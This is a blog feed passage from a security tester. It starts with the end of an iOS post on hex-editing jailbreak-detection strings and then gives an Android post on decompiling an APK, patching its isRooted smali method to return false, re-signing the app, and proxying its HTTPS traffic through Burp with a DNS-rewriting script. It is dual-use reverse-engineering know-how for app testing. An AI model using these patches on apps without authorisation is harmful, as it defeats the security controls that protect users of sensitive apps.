&lt;p&gt;In fact, there are quite a few other jailbreak related strings in this section. From within Hopper, one can check where these strings are referenced from. So, I followed this and landed up in a function that does what I would have expected a jailbreak detection function to do, but with a completely unexpected class/method name. &lt;em&gt;-[MobileDisplay isRetinaDisplay]:&lt;/em&gt;. Very sneaky :) So we are working with the &lt;code&gt;isRetinaDisplay&lt;/code&gt; method which is the one doing the jailbreak detection:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ios_jailbreak_hopper2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As can be seen in the above screenshot, the &lt;code&gt;fileExistsAtPath&lt;/code&gt; for &lt;code&gt;/Applications/Cydia.app&lt;/code&gt; is hardly something I would have expected in a &lt;code&gt;isRetinaDisplay&lt;/code&gt; implementation :P&lt;/p&gt;

&lt;h2 id=&#34;planning-an-attack&#34;&gt;planning an attack&lt;/h2&gt;

&lt;p&gt;At this stage, I was fairly certain that I had found the code I was looking for. From the method name &lt;em&gt;isRetinaDisplay&lt;/em&gt;, I reasoned a little and guessed that this was actually supposed to say &lt;code&gt;isJailBroken&lt;/code&gt;. I want this method to return false. My mind went straight to getting &lt;a href=&#34;http://www.cycript.org/&#34;&gt;cycript&lt;/a&gt; ready for some &lt;a href=&#34;http://iphonedevwiki.net/index.php/Cycript_Tricks&#34;&gt;method swizzling&lt;/a&gt;. I started to set things up and played around a little, when I realized that I don&amp;rsquo;t think I will be able to manipulate the runtime fast enough for this to work. Remember, the first thing the app does is check the jailbreak status.&lt;/p&gt;

&lt;p&gt;A bit of thinking, a few coffees, special alone time with Google and lots of reading, I come to realize that even if I &lt;em&gt;was&lt;/em&gt; able to get this method swizzling to work, I&amp;rsquo;d have to do this every time the application starts up. This was not going to work for me. It was time to rethink my strategy.&lt;/p&gt;

&lt;p&gt;Considering &lt;em&gt;how&lt;/em&gt; the jailbreak detection works, most of the ways that I saw in the application were related to file existence checks. There was also an attempt to write to &lt;code&gt;/private/jailbreak.txt&lt;/code&gt;, as well as open a &lt;code&gt;cydia://&lt;/code&gt; url. I realized that I could probably just change these strings to things that will inherently fail and cause the method to not return true for any of the checks.&lt;/p&gt;

&lt;h2 id=&#34;in-1992-we-had-hex-editors-too&#34;&gt;in 1992 we had hex editors too&lt;/h2&gt;

&lt;p&gt;I ssh&amp;rsquo;d into my iPad and located the applications installed directory. Once I had found this, I &lt;code&gt;scp&lt;/code&gt;&amp;rsquo;d the compiled binary to my kali linux install, and opened it in a hex editor. I realized later I could have probably just used the binary I already had locally :P&lt;/p&gt;

&lt;p&gt;Referencing the disassembly of &lt;code&gt;isRetinaDisplay&lt;/code&gt;, I searched for the strings it used using a Hex editor. Each string I would replace a few characters with &lt;code&gt;0&lt;/code&gt; ensuring that I keep the original string length intact. For eg: &lt;code&gt;/bin/bash&lt;/code&gt; was replaced with &lt;code&gt;/bin/ba00&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I ended up editing the following strings using the hex editor:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;/Applications/Cydia.app -&amp;gt; /Applications/Cyd00.app&lt;/li&gt;
&lt;li&gt;/Library/MobileSubstrate/MobileSubstrate.dylib -&amp;gt; /Library/MobileSubstrate/MobileSubstra00.dylib&lt;/li&gt;
&lt;li&gt;/bin/bash -&amp;gt; /bin/ba00&lt;/li&gt;
&lt;li&gt;/usr/sbin/sshd -&amp;gt; /usr/sbin/ss00&lt;/li&gt;
&lt;li&gt;/etc/apt -&amp;gt; /etc/a00&lt;/li&gt;
&lt;li&gt;/private/jailbreak.txt -&amp;gt; /0000000/0000000000000&lt;/li&gt;
&lt;li&gt;cydia://package/com.example.package -&amp;gt; cyd00://package/com.example.package&lt;/li&gt;
&lt;/ul&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/ios_jailbreak_hex_editor.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I saved the modifications that I had done, and &lt;code&gt;scp&lt;/code&gt;&amp;rsquo;d the binary back to my iPad to the folder where it was installed. I literally just overwrote the existing binary. At this stage I figured I will most certainly have some form of signing related problem as the binary has been tampered with. Well, this was not the case. Instead, I no longer was greeted with the lame jailbreak security error :P&lt;/p&gt;

&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;

&lt;p&gt;In the end, it was pretty easy to find the jailbreak detection code. Deducing a few things based on the disassembly made it easy to find the method responsible for the checks, regardless of the attempt to hide it via a name change. Furthermore, using something as simple as a hex editor, a trivial implementation such as this was very easily bypassed :)&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>no more jailbreak detection an adventure into Android app reversing and smali patching</title>
      <link>https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-app-reversing-and-smali-patching/</link>
      <pubDate>Mon, 09 Feb 2015 19:10:23 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-app-reversing-and-smali-patching/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;I will start by saying that I am by &lt;em&gt;no means&lt;/em&gt; a expert in anything you are about to read. I am also not 100% sure about the correct terminology for this type of patching. Maybe it should have been called binary patching? I don&amp;rsquo;t know, but I do know that I was quite literally shocked by the ease of getting this job done, and figured its time to make some notes for me to reflect on later again.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/android_jailbreak_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Recently I had the opportunity to poke at an Android &lt;code&gt;.apk&lt;/code&gt;. My task was a little different from what I am about to blog about, but the fundamental idea remained the same. I wanted to inspect some traffic of an application, but the application had jailbreak detection built in and refused to run if the device its running on is detected as jailbroken. This had to be bypassed first. To play with the &lt;code&gt;apk&lt;/code&gt;, I needed to get some tools setup and learn a few things about the Android environment &lt;em&gt;really&lt;/em&gt; fast. There are tons of resources available online to describe to you the general idea behind Android, as well as how its all stitched together. You will quickly come to realize that apps can be written in Java. For the purpose of this post, the focus is to bypass the jailbreak detection the &lt;code&gt;apk&lt;/code&gt; had and let it continue normal operations.&lt;/p&gt;

&lt;p&gt;&lt;/p&gt;

&lt;h2 id=&#34;so-what-about-jailbreaking&#34;&gt;so what about jailbreaking&lt;/h2&gt;

&lt;p&gt;While I refer to jailbreaking, there are a number of terms used out there to describe the same thing. In the Android world, &lt;em&gt;rooting&lt;/em&gt; seems to be what is more commonly known. However, the premise remains the same. Rooting/Jailbreaking your device means that you escape the OS implemented sandboxing and gain full &lt;code&gt;root&lt;/code&gt; access to your device. Many mobile applications are against this as a compromised sandbox may have occurred unknowingly, effectively meaning that the device is compromised. So, as a safety measure, applications check for this and refuse to run because of it.&lt;/p&gt;

&lt;p&gt;Jailbreak detection itself is a interesting field. From simple static file existence checks, to checking the exit codes of calls to &lt;code&gt;fork()&lt;/code&gt; and &lt;code&gt;su&lt;/code&gt; all the way to inspecting loaded &lt;code&gt;dynalibs&lt;/code&gt; (in the iOS world), everything is fair game. While a compromised device is a totally legit reason to not run any sensitive applications (think credential theft, traffic redirection etc), there are cases where a jailbroken device occurred on purpose. In these cases, power users may find application jailbreak detection very annoying :)&lt;/p&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;The very first thing one would obviously need is the application you want to modify. I already had the &lt;code&gt;apk&lt;/code&gt; I wanted to modify at hand. If you don’t have it then there are many ways to get an already installed &lt;code&gt;apk&lt;/code&gt; off a device. You just need to Google it :) Like, &lt;a href=&#34;http://stackoverflow.com/questions/4032960/how-do-i-get-an-apk-file-from-an-android-device&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Just having the &lt;code&gt;apk&lt;/code&gt; though was not very useful. I needed something to run it on. I don’t have a hardware device handy so in comes the Android Studio, which includes the SDK and a Emulator. I downloaded the Android Studio &lt;a href=&#34;http://developer.android.com/sdk/index.html&#34;&gt;here&lt;/a&gt; and promptly installed it. I fired it up and clicked next furiously, waiting for more crap to download, till finally it looked like it was done.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/android_jailbreak_android_studio.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The next daunting task was to find the SDK updater. I wanted to install the x86 Emulator Accelerator amongst other things. Some searching around got me to the directory &lt;code&gt;~/Library/Android/sdk/tools&lt;/code&gt; which had the &lt;code&gt;android&lt;/code&gt; and &lt;code&gt;emulator&lt;/code&gt; programs I was after. I fired up the SDK updater with &lt;code&gt;~/Library/Android/sdk/tools/android&lt;/code&gt; and updated/installed all the stuff I wanted (yay more downloading). In the end, my installed packages ended up as follows:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/android_jailbreak_sdk_manager.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;preparing-an-actual-emulator&#34;&gt;preparing an actual emulator&lt;/h2&gt;

&lt;p&gt;With the software I needed for the emulator downloaded and ready, it was time to configure a &lt;code&gt;avd&lt;/code&gt; (Android Virtual Device). I fired up the command &lt;code&gt;~/Library/Android/sdk/tools/android avd&lt;/code&gt; and was presented with the Android Virtual Device Manager. I then proceeded to create a New device as follows:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/android_jailbreak_avd.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Saved that and quit the AVD Manager. That is all that I needed for the hardware portion. To test the &lt;code&gt;avd&lt;/code&gt; that I have just made, I chose to run it quickly using &lt;code&gt;~/Library/Android/sdk/tools/emulator -avd test&lt;/code&gt;:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/android_jailbreak_emulator_running.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Aaaand it works! I was actually testing network connectivity of the &lt;code&gt;apk&lt;/code&gt; in question, so I will add the information for that at the end of the post as a small FYI.&lt;/p&gt;

&lt;p&gt;With the emulator running and working, it was time to install the &lt;code&gt;apk&lt;/code&gt; to test. To do this, we use a tool call &lt;code&gt;adb&lt;/code&gt;. This can be found in &lt;code&gt;~/Library/Android/sdk/platform-tools/adb&lt;/code&gt;. A number of features are available to us using &lt;code&gt;adb&lt;/code&gt;, such as pushing files to and from the device and installing applications. The &lt;code&gt;apk&lt;/code&gt; I was testing, was installed while the emulator was running:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@laptop » ~/Library/Android/sdk/platform-tools/adb install ~/MyApplication.apk
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
2383 KB/s (4184313 bytes in 1.714s)
    pkg: /data/local/tmp/MyApplication.apk
Success
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The application popped up under the menu on the emulator and I was able to launch it. However, the application sees the Andriod Emulator as a jailbroken device, and refuses to start up. Not a problem :)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; If you get a error such as &lt;em&gt;INSTALL_FAILED_DUPLICATE_PERMISSION&lt;/em&gt;, it usually meant that the application is already installed. Simply uninstall it from the emulator and retry the install. The storage on the emulator was persistent throughout reboots for me which was quite nice too.&lt;/p&gt;

&lt;h2 id=&#34;looking-at-the-apk-getting-the-juicy-bits&#34;&gt;looking at the apk, getting the juicy bits&lt;/h2&gt;

&lt;p&gt;Before I could even begin to think about where to look for the Jailbreak checking code, I first had to understand very quickly how a &lt;code&gt;apk&lt;/code&gt; gets to be, and what it contains. Most importantly, the &lt;code&gt;apk&lt;/code&gt; can be unzipped and its contents further examined. &lt;a href=&#34;http://en.wikipedia.org/wiki/Android_application_package&#34;&gt;Wikipedia&lt;/a&gt; does a very good of giving you a rundown on a very high level. Just enough to grasp which parts may be of interest. It seemed like the juicy bits I am after will be in &lt;code&gt;classes.dex&lt;/code&gt;. This is what looks like to be the compiled logic in the [dex file format](&lt;a href=&#34;http://en.wikipedia.org/wiki/Dalvik_(software&#34;&gt;http://en.wikipedia.org/wiki/Dalvik_(software&lt;/a&gt;) understandable by the Dalvik virtual machine. Ok. But how do I make that into something &lt;strong&gt;I&lt;/strong&gt; can understand?&lt;/p&gt;

&lt;p&gt;In comes &lt;a href=&#34;https://code.google.com/p/dex2jar/&#34;&gt;dex2jar&lt;/a&gt;. A utility that will convert android dex files into Java source. :) I &lt;a href=&#34;https://dex2jar.googlecode.com/files/dex2jar-0.0.9.15.zip&#34;&gt;downloaded&lt;/a&gt; the latest archive and extracted it. I then extracted classes.dex from the &lt;code&gt;apk&lt;/code&gt; too:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@Laptop » unzip MyApplication.apk classes.dex
Archive:  MyApplication.apk
  inflating: classes.dex
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the &lt;code&gt;classes.dex&lt;/code&gt; file ready, I ran it through &lt;code&gt;dex2jar&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@Laptop » dex2jar-0.0.9.15/dex2jar.sh classes.dex
this cmd is deprecated, use the d2j-dex2jar if possible
dex2jar version: translator-0.0.9.15
dex2jar classes.dex -&amp;gt; classes_dex2jar.jar
Done.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now have a &lt;code&gt;jar&lt;/code&gt; file that I could open up in something like &lt;a href=&#34;http://deathmarine.github.io/Luyten/&#34;&gt;Luyten&lt;/a&gt; and examine further. I downloaded the latest &lt;a href=&#34;https://github.com/deathmarine/Luyten/releases/download/v0.4.3/luyten-0.4.3.jar&#34;&gt;Luyten jar&lt;/a&gt; and opened the &lt;code&gt;classes_dex2jar.jar&lt;/code&gt; file with &lt;code&gt;java -jar luyten-0.4.3.jar classes_dex2jar.jar&lt;/code&gt;. This totally looks like Java sources for the application :D&lt;/p&gt;

&lt;p&gt;I went through quite a large amount of code, trying to piece together how everything fits into one another. After some time, I finally came across &lt;code&gt;RootDetection.class&lt;/code&gt;:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/android_jailbreak_root_detection_class.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This is only a section of the code that attempts to detect if the device that the application is running on is rooted. Quite a number of checks are present, however the failure comes in where its only 1 method that is being used to return the Jailbreak status. This method was right at the end and was called &lt;code&gt;isRooted&lt;/code&gt;. You will see in the next few paragraphs how trivial it is to bypass this.&lt;/p&gt;

&lt;h2 id=&#34;decompiling-the-classes-dex&#34;&gt;decompiling the classes.dex&lt;/h2&gt;

&lt;p&gt;With some knowledge about the code, and knowing what I am after (the &lt;code&gt;RootDetection&lt;/code&gt; class, &lt;code&gt;isRooted&lt;/code&gt; method), it was time to move on to decompiling the dex to smali. This can be done easily using &lt;a href=&#34;https://code.google.com/p/smali/&#34;&gt;smali/baksmali&lt;/a&gt; which is an assembler/disassembler for Android&amp;rsquo;s dex format. I downloaded the latest versions of &lt;a href=&#34;https://bitbucket.org/JesusFreke/smali/downloads/smali-2.0.5.jar&#34;&gt;smali&lt;/a&gt; and &lt;a href=&#34;https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.0.5.jar&#34;&gt;baksmali&lt;/a&gt; and prepared to disassemble the &lt;code&gt;classes.dex&lt;/code&gt; file that we used earlier to get some Java sources out of.&lt;/p&gt;

&lt;p&gt;Using the &lt;code&gt;baksmali&lt;/code&gt; tool, I pushed &lt;code&gt;classes.dex&lt;/code&gt; through it to a output directory of &lt;code&gt;out&lt;/code&gt; with &lt;code&gt;java -jar baksmali-2.0.5.jar classes.dex -o out&lt;/code&gt;. This produced the disassembled version of the classes.dex and allowed me to read through it. I don’t really get a lot of this &lt;code&gt;smali&lt;/code&gt;, but it is not that hard to find what you may be looking for. A simple grep may reveal all the answers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@Laptop » grep -Ri isRooted out/
Binary file out//classes.dex matches
out//com/MyApplication/utils/RootDetection.smali:.method public isRooted(Landroid/content/pm/PackageManager;)Z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay. the &lt;code&gt;isRooted&lt;/code&gt; method is easily identifiable. Opening the file containing the the &lt;code&gt;isRooted&lt;/code&gt; method reveals the smali too:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;.method public isRooted(Landroid/content/pm/PackageManager;)Z
    .registers 3
    .param p1, &amp;quot;pm&amp;quot;    # Landroid/content/pm/PackageManager;

    .prologue
    .line 74
    invoke-direct {p0}, Lcom/MyApplication/utils/RootDetection;-&amp;gt;isTestKeyBuild()Z

[... snip ...]

    .line 76
    :goto_19
    return v0

    :cond_1a
    const/4 v0, 0x0

    goto :goto_19
.end method
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome.&lt;/p&gt;

&lt;h2 id=&#34;preparing-the-patch&#34;&gt;preparing the patch&lt;/h2&gt;

&lt;p&gt;As we can see, &lt;code&gt;isRooted&lt;/code&gt; has quite a bit of logic in it. Referring back to the &lt;code&gt;jar&lt;/code&gt; file I created with &lt;code&gt;dex2jar&lt;/code&gt;, we can deduce that we want &lt;code&gt;isRooted&lt;/code&gt; to return &lt;code&gt;false&lt;/code&gt;. Makes sense right? Now, I don’t write smali out of my head, but that did not stop me. How can I see what smali code would look like to just return &lt;code&gt;false&lt;/code&gt;? Well, I could just write my own &lt;code&gt;.java&lt;/code&gt; code, compile it, and check what the output is like once its disassembled right? Yep!&lt;/p&gt;

&lt;p&gt;So I created &lt;code&gt;RootDetection.java&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class RootDetection
{
    public boolean isRooted() {
        return false;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, &lt;code&gt;isRooted&lt;/code&gt; will now just return false as I&amp;rsquo;d like it to! I had to hack away a bit at it to get the compilation to pass without errors, and this is probably the step that will usually require a bit of intuition. An important thing to note here is that I had to remove the argument from the original &lt;code&gt;isRooted&lt;/code&gt; call. I had to keep this in mind when I was going to patch the original method. Anyways, I compiled the file &lt;code&gt;RootDetection.java&lt;/code&gt; using the &lt;code&gt;javac&lt;/code&gt; command line:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@Laptop » javac -source 1.6 -target 1.6 RootDetection.java
warning: [options] bootstrap class path not set in conjunction with -source 1.6
1 warning
------------------------------------------------------------
leonjza@Laptop » file RootDetection.class
RootDetection.class: compiled Java class data, version 50.0 (Java 1.6)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You will notice I specified the &lt;code&gt;-source&lt;/code&gt; and &lt;code&gt;-target&lt;/code&gt; flags for &lt;code&gt;javac&lt;/code&gt;. If I did not do this, &lt;code&gt;baksmali&lt;/code&gt; would have not been able to decompile the java class :(&lt;/p&gt;

&lt;p&gt;With my compiled method ready, it was time to see what this looks like in smali. There was just one more thing stopping me from seeing that though. The compiled java is not in the dex format that Andriod uses. Luckily there is a tool to convert this that comes with the Android sdk and lives in &lt;code&gt;~/Library/Android/sdk/build-tools/21.1.1/dx&lt;/code&gt;. I converted the &lt;code&gt;class&lt;/code&gt; to &lt;code&gt;dex&lt;/code&gt; format using the command &lt;code&gt;~/Library/Android/sdk/build-tools/21.1.1/dx --dex  --output=RootDetection.dex RootDetection.class&lt;/code&gt;. This produced a new file called &lt;code&gt;RootDetection.dex&lt;/code&gt; which is recognizable by &lt;code&gt;baksmali&lt;/code&gt;. I  then proceeded to decompile the generated &lt;code&gt;.dex&lt;/code&gt; with &lt;code&gt;baksmali&lt;/code&gt; and set the output to &lt;code&gt;RootDetection/&lt;/code&gt; with &lt;code&gt;java -jar baksmali-2.0.5.jar RootDetection.dex -o RootDetection/&lt;/code&gt;. Inspecting the generated smali code, I now had a sample of what it would look like if it should simply return false:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# virtual methods
.method public isRooted()Z
    .registers 2

    .prologue
    .line 4
    const/4 v0, 0x0

    return v0
.end method
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The plan now was to simply replace the originally generated smali from the &lt;code&gt;apk&lt;/code&gt;&amp;rsquo;s &lt;code&gt;classes.dex&lt;/code&gt; and re-assemble it using &lt;code&gt;smali&lt;/code&gt;. I opened up the original &lt;code&gt;isRooted&lt;/code&gt; code and replaced it with the sample that I had generated myself. Remembering the argument I had to remove from my compiled version, I figured that because the original method defined &lt;code&gt;.registers 3&lt;/code&gt;, and mine defined &lt;code&gt;.registers 2&lt;/code&gt;, I had to up it to 3 to keep the method argument in mind. This was the last modification that I did.&lt;/p&gt;

&lt;p&gt;With the &lt;code&gt;RootDetection&lt;/code&gt; class now patched, I re-assembled the &lt;code&gt;classes.dex&lt;/code&gt; file from the generated smali code with &lt;code&gt;java -jar smali-2.0.5.jar -o classes.dex out&lt;/code&gt;. The Reassembly generated no errors so I assumed it was successful.&lt;/p&gt;

&lt;h2 id=&#34;repackaging-and-signing-the-apk&#34;&gt;repackaging and signing the apk&lt;/h2&gt;

&lt;p&gt;With the patch applied and the new &lt;code&gt;classes.dex&lt;/code&gt; generated, it was time to repackage the &lt;code&gt;apk&lt;/code&gt;. The first step was to add the new &lt;code&gt;classes.dex&lt;/code&gt; to the &lt;code&gt;apk&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@Laptop » zip MyApplication.apk classes.dex
updating: classes.dex (deflated 56%)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, the package has to be resigned as the &lt;code&gt;classes.dex&lt;/code&gt; will no longer have the same hashes in &lt;code&gt;META-INF/MANIFEST.MF&lt;/code&gt; as it originally had. Attempts to install the repackeged &lt;code&gt;apk&lt;/code&gt; without resigning it may result in a error such as &lt;em&gt;Failure [INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION]&lt;/em&gt;. I used a tool called &amp;lsquo;sign&amp;rsquo; found &lt;a href=&#34;https://github.com/appium/sign&#34;&gt;here&lt;/a&gt; to get hold of &lt;code&gt;sign.jar&lt;/code&gt;. This would sign my apk using the test keys. I downloaded it using &lt;code&gt;wget https://github.com/appium/sign/raw/master/dist/sign.jar&lt;/code&gt;, and ran it to sign my patched &lt;code&gt;apk&lt;/code&gt; with &lt;code&gt;java -jar sign.jar MyApplication_no_root.apk&lt;/code&gt;. This produced a file called &lt;code&gt;MyApplication_no_root.s.apk&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Excellent. The only thing left for me to do was to install the application using &lt;code&gt;adb&lt;/code&gt; and see if my patch worked, which it did! :D The usual error message about the jailbreak no longer displayed and I could continue with the rest of my testing.&lt;/p&gt;

&lt;h2 id=&#34;notes-about-traffic-interception&#34;&gt;notes about traffic interception&lt;/h2&gt;

&lt;p&gt;I have covered what I originally intended with the jailbreak detection patching, but want to add a few notes about traffic interception using the Emulator.&lt;/p&gt;

&lt;p&gt;I used &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp Suite&lt;/a&gt; to intercept traffic and had it running locally, with a proxy open on &lt;code&gt;tcp/8080&lt;/code&gt;. To redirect the emulators traffic though, I had to add a startup option to the emulator as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~/Library/Android/sdk/tools/emulator -avd test -http-proxy localhost:8080
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This proved affective and I was able to see &lt;code&gt;http&lt;/code&gt; traffic just fine. However, when it came to &lt;code&gt;https&lt;/code&gt; traffic, I wanted to take a spoon and remove my eye. Requests would just &amp;lsquo;hang&amp;rsquo;, the browser would freak out, the application I was testing would just stall, it was just a mess. Some research into the topic revealed I was not the only one planning some personal surgery and a few bright people have come up with some solutions.&lt;/p&gt;

&lt;p&gt;The first pain I had was even though I installed the PortSwagger CA onto the device (via &lt;code&gt;~/Library/Android/sdk/platform-tools/adb push ~/Downloads/BurpCa.cer /storage/sdcard&lt;/code&gt; and then the devices Settings -&amp;gt; Security -&amp;gt; Install form SD Card), the certificate validation would still just fail due to date errors. So, I moved the devices date on by 3 days, and viola! Grr.&lt;/p&gt;

&lt;p&gt;The next pain was the fact that the Emulator (or Android OS?) would not attempt to make a request to hostnames, but to the IP&amp;rsquo;s directly, making it very hard to trace in Burp. Luckily though, I found a script (and lost the original source, but I take no credit for this), that will help with the rewrites to hostnames and pass them to Burp as expected. This was mostly a problem in the application itself and not so much the web browser. The script to help with this was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# TODO&#39;s:
# - Script currently doesn&#39;t treat TCP connections a streamed data. Normally we should buffer input
#   untill enough data has been received and then do our checks. However since the connections are
#   local all data is received at once (most of the time) so this code does work :)
import twisted
from twisted.names import server, dns, client
from twisted.internet import reactor, defer
from twisted.internet.endpoints import TCP4ServerEndpoint
from twisted.protocols import portforward
import re
from socket import *
import struct

# symbolic definition of getsockopt parameter
SO_ORIGINAL_DST = 80

# Mapping of domain name to given unique IP
mappings = dict()
# Mapping of given unique IP to domain name
reversemappings = dict()


# --------------------------------------- DNS SERVER ---------------------------------------


# Custom DNS server which assigns a unique IP address to every domain, even if
# in reality two domains share the same IP.
class ProxyResolver(client.Resolver):

        # Start with IP 1.1.1.1
        def __init__(self, servers):
                client.Resolver.__init__(self, servers=servers)
                self.ttl = 10
                self.ip = [1, 1, 1, 1]

        # Helper function: Move to next IP and return it as a string
        def nextIp(self):
                self.ip[3] += 1
                for i in range(3,1,-1):
                        if (self.ip[i] == 255):
                                self.ip[i] = 1
                                self.ip[i-1] += 1
                return str(self.ip[0]) + &amp;quot;.&amp;quot; + str(self.ip[1]) + &amp;quot;.&amp;quot; +str(self.ip[2]) + &amp;quot;.&amp;quot; +str(self.ip[3])

        def lookupAddress(self, name, timeout = None):
                # If it&#39;s the first time a DNS lookup is done for this domain, assign it
                # a unique IP and update the mappings
                if (not mappings.has_key(name)):
                        ip = self.nextIp()
                        mappings[name] = ip
                        reversemappings[str(self.ip[0]) + &amp;quot;.&amp;quot; + str(self.ip[1]) + &amp;quot;.&amp;quot; +str(self.ip[2]) + &amp;quot;.&amp;quot; +str(self.ip[3])] = name

                # Get the mapped IP!
                ip = mappings[name]
                print &amp;quot;DNS:&amp;quot;, name, &amp;quot;-&amp;gt;&amp;quot;, ip

                # From the manual: &amp;quot;Defer is useful when you&#39;re writing synchronous code to an asynchronous
                # interface: i.e., some code is calling you expecting a Deferred result, but you don&#39;t actually
                # need to do anything asynchronous. Just return defer.succeed(theResult).&amp;quot;
                return defer.succeed([(dns.RRHeader(name, dns.A, dns.IN, self.ttl, dns.Record_A(ip, self.ttl)),), (), ()])


# --------------------------------------- HTTP PROXY ---------------------------------------


# Communication between your actual proxy (Burp, WebScarab, ..) and our script.
class ProxyClient(portforward.ProxyClient):
        def __init__(self):
                self.gotestablished = False
                self.requestdata = None

        def setRequestData(self, data):
                self.requestdata = data

        def dataReceived(self, data):
                # TODO: How does this work when proxying a real device?! Connect shouldn&#39;t be sent then?!
                if self.gotestablished or self.requestdata == None:
                        # If the connection has been established just forward the data to the emulator
                        # TODO: Check this
                        portforward.ProxyClient.dataReceived(self, data)
                else:
                        # TODO: Check this
                        if not &amp;quot;HTTP/1.0 200 Connection established\r\n\r\n&amp;quot; in data:
                                print &amp;quot;Warning: Unexpected proxy reply:&amp;quot;, repr(data[:30])
                        else:
                                print &amp;quot;Proxy CONNECT reply: &amp;gt;&amp;quot;, repr(data[:30])

                        self.gotestablished = True
                        # Forward data to Android
                        self.transport.write(self.requestdata)


# TODO: Check this
class ProxyClientFactory(portforward.ProxyClientFactory):
        protocol = ProxyClient


# Custom HTTP proxy. Intercepts the CONNECT &amp;lt;ip&amp;gt; command, looks up the corresponding domain name, and
# forwards the correct CONNECT &amp;lt;domain&amp;gt; command to your actual proxy.
class ProxyServer(portforward.ProxyServer):
        clientProtocolFactory = ProxyClientFactory

        def __init__(self):
                self.receivedfirst = False
                self.connectre = re.compile(r&#39;CONNECT (\d+\.\d+\.\d+\.\d+):\d+ HTTP&#39;)
                self.otherre = re.compile(r&#39;\w+ http://(\d+\.\d+\.\d+\.\d+)&#39;)
                self.firstdata = None


        def dataReceived(self, data):
                # The first time we recieve data we must check for invisible proxiying and rewrite
                # the CONNECT/GET requests to use the actual domain name.
                if not self.receivedfirst:
                        print &amp;quot;INCOMING TCP CONN: &amp;gt;&amp;quot;, repr(data.split(&amp;quot;\r&amp;quot;)[0][:40])

                        # Of course invisible proxying is unnecessairy if the CONNECT command is actually used!

                        # ------------------------- Invisible Proxying Support ---------------------------

                        # TODO: This is UNTESTED and EXPERIMENTAL code
                        &amp;quot;&amp;quot;&amp;quot;

                        # TODO: Get ourselves an Android VMWare image and test this :)
                        # Only do invisible proxifying if there is no CONNECT command
                        # TODO: We should actually check if it *START* with CONNECT
                        if not &amp;quot;CONNECT&amp;quot; in data:

                                # We support invisible proxying for real Android devicec, where the computer is configured
                                # as the router, and all HTTP(S) traffic is redirected to our tool. In this scenario we
                                # don&#39;t receive a CONNECT request. Instead we get the original destination IP address and
                                # manually construct the CONNECT request.

                                # TODO: Test this on other operating systems than Linux
                                try:
                                        # Ask the OS the original destination of the connection
                                        dst = socket.getsockopt(self.transport.socket, SOL_IP, SO_ORIGINAL_DST, 16)
                                        # Exclamation mark tells unpack that dst is big-endian
                                        # 2x  : two pad bytes
                                        # H   : unsigned short (port)
